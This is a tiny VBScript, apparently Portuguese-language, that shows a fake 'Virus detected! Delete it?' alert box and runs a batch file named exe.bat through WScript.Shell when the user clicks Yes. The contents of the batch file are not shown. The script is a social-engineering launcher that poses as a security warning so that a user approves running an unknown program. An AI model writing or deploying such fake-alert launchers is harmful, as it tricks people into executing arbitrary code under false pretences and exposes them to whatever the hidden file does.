Dim window 
intOpcao = msgbox("Virus detectado!!! Deseja excluir?",vbYesNo,"Alerta") 
if intOpcao = vbyes then 
   set teste = WScript.CreateObject("WScript.Shell")

teste.run("exe.bat")


end if